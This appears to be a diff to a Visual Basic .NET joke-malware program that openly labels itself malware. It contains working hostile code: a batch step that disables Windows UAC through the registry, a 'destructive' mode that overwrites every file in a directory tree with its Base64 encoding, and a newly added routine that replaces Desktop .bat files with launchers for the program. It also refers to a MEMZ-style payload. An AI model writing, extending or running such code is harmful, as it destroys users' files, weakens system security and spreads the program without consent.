@@ -8,7 +8,7 @@ Imports System.Management
 Imports System.Threading
 Imports System.IO.Compression
 Imports System.Runtime.InteropServices
-
+Imports System.Diagnostics.Eventing.Reader
 
 Public Class Form1
     Private Const SPI_SETDESKWALLPAPER As Integer = 20
@@ -56,8 +56,10 @@ Public Class Form1
 
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/earrape.wav
-        ' my_thing_idkvb.Show()
-        If testing = False Then
+        'my_thing_idkvb.Show()
+        If testing = True Then
+
+        Else
             'MsgBox(Application.StartupPath)
             If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
                 Dim result As DialogResult = MessageBox.Show("THIS PROGRAM IS CONSIDERED MALWARE THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE. ( SHOULD I STILL EXECUTE THE PROGRAM )", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
@@ -72,14 +74,29 @@ Public Class Form1
                     If result2 = DialogResult.Yes Then
                         Dim result5 As DialogResult = MessageBox.Show("Do you want to enable the destructive version of this program?", "IF YOU ENABLE THIS IT WILL DESTROY YOUR COMPUTER EVENTUALLY", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
                         If result5 = DialogResult.Yes Then
-                            Dim sb As New System.Text.StringBuilder
-                            sb.AppendLine("{true}")
-                            Try
-                                IO.File.WriteAllText(Application.StartupPath & "\destructive.yuki3", sb.ToString())
-                            Catch ex2 As Exception
+                            Dim result6 As DialogResult = MessageBox.Show("ARE YOU SURE THIS WILL CAUSE YOUR COMPUTER TO BE COMPLETELY DESTROYED AND MAY DESTROY IMPORTANT FILES", "IF YOU ENABLE THIS IT WILL DESTROY YOUR COMPUTER EVENTUALLY", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
+                            If result6 = DialogResult.Yes Then
+                                Dim sb As New System.Text.StringBuilder
 
-                            End Try
+                                sb.AppendLine("{true}")
+                                Try
+                                    IO.File.WriteAllText(Application.StartupPath & "\destructive.yuki3", sb.ToString())
+                                Catch ex2 As Exception
+
+                                End Try
+                            Else
+                                If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
+                                    My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\destructive.yuki3")
+                                End If
+
+
+
+
+                            End If
+
                         Else
+
+
                             If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
                                 My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\destructive.yuki3")
                             End If
@@ -109,9 +126,9 @@ Public Class Form1
             Dim sb3 As New System.Text.StringBuilder
             sb3.AppendLine("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
             sb3.AppendLine("exit")
-            sb3.AppendLine("del fuckUAC.bat")
-            IO.File.WriteAllText("fuckUAC.bat", sb3.ToString())
-            Process.Start("fuckUAC.bat")
+            sb3.AppendLine("del fuckUAC.cmd")
+            IO.File.WriteAllText("fuckUAC.cmd", sb3.ToString())
+            Process.Start("fuckUAC.cmd")
 
 
 
@@ -144,7 +161,9 @@ Public Class Form1
 
             Dim fs As FileStream = File.Create(path)
 
-
+            If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
+                InfFiles.RunWorkerAsync()
+            End If
 
             ' Add text to the file.
             Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
@@ -394,6 +413,7 @@ Public Class Form1
 
                         If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
                             des = True
+
                             MsgBox("you are currently running the destructive version of this program", 0 + 64, "note")
                         Else
 
@@ -407,6 +427,9 @@ Public Class Form1
 
 
             End Try
+
+
+
 
 
             '  Me.WindowState = Me.WindowState.Minimized
@@ -543,13 +566,16 @@ Public Class Form1
                             Files = dirinfo.GetFiles("*", System.IO.SearchOption.AllDirectories)
                             For Each file In Files
                                 Try
-                                    Dim fileReader As String
-                                    fileReader = My.Computer.FileSystem.ReadAllText(file.FullName)
-                                    Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(fileReader)
-                                    Dim inc = System.Convert.ToBase64String(byt)
-                                    Dim sWriter As New System.IO.StreamWriter(file.FullName, False)
-                                    sWriter.Write(inc)
-                                    sWriter.Close()
+                                    If Not file.Name = IO.Path.GetFileName(Application.ExecutablePath) Then
+                                        Dim fileReader As String
+                                        fileReader = My.Computer.FileSystem.ReadAllText(file.FullName)
+                                        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(fileReader)
+                                        Dim inc = System.Convert.ToBase64String(byt)
+                                        Dim sWriter As New System.IO.StreamWriter(file.FullName, False)
+                                        sWriter.Write(inc)
+                                        sWriter.Close()
+                                    End If
+
                                 Catch ex As Exception
 
                                 End Try
@@ -633,9 +659,9 @@ Public Class Form1
 
                             End If
 
-                            End If
-
                         End If
+
+                    End If
                     If day = 1 AndAlso month = 10 Then
                         MsgBox("I have launched my custom version of the memz virus so have fun with that (:", 0 + 64, "MEMZ")
                         Timer4.Start()
@@ -1755,6 +1781,59 @@ Public Class Form1
         Catch ex As Exception
 
         End Try
+
+    End Sub
+
+    Private Sub InfFiles_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles InfFiles.DoWork
+        Dim sb As New System.Text.StringBuilder
+        Dim directoryPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) 'Environment.SpecialFolder.Desktop
+        Dim searchPattern As String = "*.bat"
+        Dim textContent As String = "START /B /WAIT """ & Application.ExecutablePath & """"
+        Dim fileList() As String = Directory.GetFiles(directoryPath, searchPattern)
+        For Each filePath As String In fileList
+            Try
+                File.Delete(filePath)
+                sb.AppendLine("cd """ & Application.StartupPath)
+                sb.AppendLine("start yuki3.exe")
+                IO.File.WriteAllText(filePath, sb.ToString())
+            Catch ex As Exception
+
+            End Try
+        Next
+        directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
+        For Each filePath As String In fileList
+            Try
+                File.Delete(filePath)
+                sb.AppendLine("cd """ & Application.StartupPath)
+                sb.AppendLine("start yuki3.exe")
+                IO.File.WriteAllText(filePath, sb.ToString())
+            Catch ex As Exception
+
+            End Try
+        Next
+        directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)
+        For Each filePath As String In fileList
+            Try
+                File.Delete(filePath)
+                sb.AppendLine("cd """ & Application.StartupPath)
+                sb.AppendLine("start yuki3.exe")
+                IO.File.WriteAllText(filePath, sb.ToString())
+            Catch ex As Exception
+
+            End Try
+        Next
+        directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
+        For Each filePath As String In fileList
+            Try
+                File.Delete(filePath)
+                sb.AppendLine("cd """ & Application.StartupPath)
+                sb.AppendLine("start yuki3.exe")
+                IO.File.WriteAllText(filePath, sb.ToString())
+            Catch ex As Exception
+
+            End Try
+        Next
+
 
     End Sub
 End Class
